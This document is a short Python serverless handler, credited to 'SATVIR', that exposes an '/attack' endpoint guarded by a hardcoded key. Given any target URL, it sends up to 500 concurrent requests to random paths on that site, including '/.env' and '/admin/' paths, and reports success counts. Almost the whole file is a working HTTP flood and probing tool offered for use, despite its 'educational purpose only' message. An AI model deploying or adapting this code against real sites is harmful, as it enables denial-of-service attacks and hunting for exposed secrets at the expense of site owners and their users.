# -*- coding: utf-8 -*-
# API: /attack?api=attackAPI&target=https://example.com
# Created by: SATVIR

import json
import asyncio
import aiohttp
import random
import string
from datetime import datetime

def random_str(n=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def send_flood(session, url):
    try:
        paths = [
            f'/api/{random_str(12)}', f'/v1/{random_str(10)}', f'/admin/{random_str(8)}',
            f'/user/{random_str(10)}', '/.env', '/null', f'/{random_str(20)}'
        ]
        target = url.rstrip('/') + random.choice(paths)
        async with session.get(target, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            return resp.status
    except:
        return None

async def run_attack(url, count=100):
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_flood(session, url) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r and r == 200)
        errors = sum(1 for r in results if r is None)
        return success, errors

def handler(request):
    query = request.query
    api_key = query.get('api', '')
    target = query.get('target', '')
    count = int(query.get('count', '100'))
    
    if api_key != 'attackAPI':
        return {
            'statusCode': 401,
            'body': json.dumps({'error': 'Invalid API key'})
        }
    
    if not target:
        return {
            'statusCode': 400,
            'body': json.dumps({'error': 'Target URL required'})
        }
    
    # Run async attack (Vercel has 10s limit)
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        success, errors = loop.run_until_complete(run_attack(target, min(count, 500)))
        loop.close()
    except Exception as e:
        success, errors = 0, count
        error_msg = str(e)
    
    return {
        'statusCode': 200,
        'headers': {'Access-Control-Allow-Origin': '*'},
        'body': json.dumps({
            'status': 'attack_executed',
            'target': target,
            'requests_sent': count,
            'success': success,
            'errors': errors,
            'message': '⚠️ EDUCATIONAL PURPOSE ONLY ⚠️',
            'created_by': 'SATVIR'
        }, indent=2)
    }
